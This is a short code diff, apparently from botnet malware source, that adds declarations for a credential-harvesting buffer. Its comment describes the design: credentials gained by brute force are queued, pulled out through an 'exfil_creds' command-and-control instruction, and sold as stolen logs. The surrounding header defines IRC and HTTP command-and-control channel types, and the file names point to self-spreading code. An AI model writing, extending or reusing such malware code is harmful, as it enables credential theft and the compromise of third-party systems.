@@ -10,6 +10,19 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
+/* ── Credential-log buffer API (#90) ───────────────────────── */
+/* Canonical declarations live in include/spread.h (the buffer is owned
+ * by spread.c). Forward-declared here so both translation units that
+ * drive the harvest/exfil see the API. Implements the smash-and-grab
+ * log-sale model: every successful brute-force credential is buffered
+ * in a bounded, mutex-protected queue and pulled by the `exfil_creds`
+ * C2 command. See spread.h for the overflow policy and thread-safety
+ * contract. */
+void spread_cred_record(const char *proto, const char *ip, uint16_t port,
+                        const char *user, const char *pass);
+unsigned int spread_cred_count(void);
+int spread_creds_drain(char **out, size_t *out_len);
+
 /* ── Connection Types ───────────────────────────────────────── */
 #define C2_IRC   0x01
 #define C2_HTTP  0x02
